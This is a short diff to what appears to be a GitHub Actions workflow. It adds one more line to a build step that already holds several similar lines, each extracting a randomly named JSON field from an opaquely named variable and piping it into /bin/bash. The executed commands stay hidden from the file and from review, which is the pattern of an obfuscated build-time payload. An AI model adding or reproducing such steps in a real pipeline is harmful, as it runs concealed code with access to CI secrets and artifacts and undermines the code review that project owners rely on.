@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$w5" | jq -r .ikghh43221 | /bin/bash
           echo $fq8 | jq -r .mxs317 | /bin/bash
           echo $qmltf15686 | jq -r .fvc87 | /bin/bash
+          printf '%s' "$aeqo117" | jq -r .qx8246 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
